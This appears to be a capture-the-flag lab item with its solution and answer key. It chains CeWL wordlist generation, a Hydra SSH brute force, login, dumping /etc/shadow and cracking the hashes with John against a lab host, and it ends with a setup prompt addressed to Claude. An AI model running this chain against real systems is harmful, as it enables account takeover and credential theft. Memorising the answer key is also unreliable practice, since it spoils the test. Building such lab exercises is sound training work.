# Q290 — Multi-Step Password Cracking Chain

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `cewl, hydra, john` |
| **Time budget** | 15–25 min |

---

## 📝 Question

"Complete chain: (1) Use CeWL to generate wordlist from target website, (2) Use Hydra with that wordlist to brute force SSH, (3) Login via SSH, (4) Dump /etc/shadow, (5) Crack remaining hashes with John. Report the final flag."

---

## 🎯 Flag Format

```
cewl_words=<count>; ssh_pass=<password>; flag=<string>
```

---

## ✅ Solution

```bash
# Step 1: Generate wordlist
cewl http://192.168.52.129 -m 5 -w cewl_list.txt
# Step 2: Brute force SSH
hydra -l msfadmin -P cewl_list.txt 192.168.52.129 ssh -t 4
# Step 3: Login
ssh msfadmin@192.168.52.129
# Step 4: Dump shadow
cat /etc/shadow > shadow.txt
# Step 5: Crack
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
cat /root/flag.txt
```

**Answer:** `cewl_words=<count>; ssh_pass=msfadmin; flag=PASSWORD_CHAIN_COMPLETE`

---

## 🤖 Claude Setup Prompt

```bash
echo "PASSWORD_CHAIN_COMPLETE" > /root/flag.txt
```
Ensure web server and SSH on target. Report back: "Lab ready for Q290 — full password cracking chain"
